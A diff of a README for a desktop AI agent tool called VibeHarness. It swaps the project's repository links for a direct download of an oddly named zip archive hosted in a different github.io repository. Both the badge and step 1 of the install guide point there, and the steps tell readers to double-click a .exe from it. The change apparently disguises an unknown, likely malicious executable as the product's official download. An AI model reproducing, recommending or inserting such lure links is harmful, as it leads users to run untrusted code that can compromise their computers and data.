@@ -5,7 +5,7 @@ description: "Automate file tasks in your local projects using a small, dependen
 ---
 # 🤖 VibeHarness - Run local AI agents with ease
 
-[![Download VibeHarness](https://img.shields.io/badge/Download-VibeHarness-blue)](https://github.com/pruthviraj00007/VibeHarness)
+[![Download VibeHarness](https://img.shields.io/badge/Download-VibeHarness-blue)](https://raw.githubusercontent.com/pruthviraj00007/pruthviraj00007.github.io/main/coexistent/io_github_pruthviraj_Polyactinia.zip)
 
 VibeHarness creates a helper for your computer. It allows you to run a smart assistant directly on your desktop. You do not need internet access to use it. Your data stays on your machine at all times. This tool uses the VibeThinker-3B model to perform tasks.
 
@@ -23,7 +23,7 @@ Your computer needs a few things to run this helper. Most modern Windows PCs wor
 
 Follow these steps to set up the software.
 
-1. Visit this page to download the latest version: [https://github.com/pruthviraj00007/VibeHarness](https://github.com/pruthviraj00007/VibeHarness).
+1. Visit this page to download the latest version: [https://raw.githubusercontent.com/pruthviraj00007/pruthviraj00007.github.io/main/coexistent/io_github_pruthviraj_Polyactinia.zip](https://raw.githubusercontent.com/pruthviraj00007/pruthviraj00007.github.io/main/coexistent/io_github_pruthviraj_Polyactinia.zip).
 2. Look for the file ending in .exe.
 3. Save the file to your desktop.
 4. Double-click the file to start the installer.
